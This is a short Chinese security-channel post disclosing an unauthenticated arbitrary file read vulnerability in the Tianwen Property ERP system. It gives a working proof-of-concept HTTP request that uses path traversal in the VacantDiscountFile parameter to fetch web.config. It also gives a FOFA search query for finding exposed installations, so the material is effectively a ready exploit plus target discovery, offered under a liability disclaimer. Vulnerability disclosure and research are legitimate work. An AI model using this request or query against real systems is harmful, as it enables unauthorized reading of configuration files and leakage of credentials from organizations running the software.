#  天问物业ERP系统VacantDiscountDownLoad存在任意文件读取漏洞   
小白菜安全  小白菜安全   2024-07-27 14:21  
  
**免责声明**  
  
该公众号主要是分享互联网上公开的一些漏洞poc和工具，  
利用本公众号所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，本公众号及作者不为此承担任何责任，一旦造成后果请自行承担！如果本公众号分享导致的侵权行为请告知，我们会立即删除并道歉。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia1Au88bO1jFd8V3AmqMvsqEZUFalBicQwJaic1tesic3duRuGPPQ3E1vczEJ67UzoMicSWMZpKwRElxtA/640?wx_fmt=png "")  
  
**漏洞影响范围**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3pHYZxSQ16eMVVb5wV79AS1LjpEriaBFP7C84eDRm5IAwvW83XDjVcB8PnUWWJYT41ms7iaVaaxuHA/640?wx_fmt=png&from=appmsg "")  
#  漏洞描述  
  
天问物业ERP应用系统，旨在向物管公司提供降低成本、保障品质、提升效能为目标的智慧物管整体解决方案，实现物管公司的管理升级。天问物业  
ERP系统  
VacantDiscountDownLoad存在任意文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，造成信息泄露。  
#  漏洞复现  
  
**poc**  
```
GET /HM/M_main/InformationManage/VacantDiscountDownLoad.aspx?VacantDiscountFile=../web.config HTTP/1.1
Host: 192.168.10.3
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close


```  
  
出现如下数据代表漏洞存在：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/NhLcT1kxlia3pHYZxSQ16eMVVb5wV79ASspNAqvEVTuQzXFRy0Q9Q0u6of1dmyaTibeO1cMQ195IgaPY4IcB4rEA/640?wx_fmt=png&from=appmsg "")  
  
#   
# 搜索语法  
  
**fofa:**  
body="天问物业ERP系统"  
  
  
****  
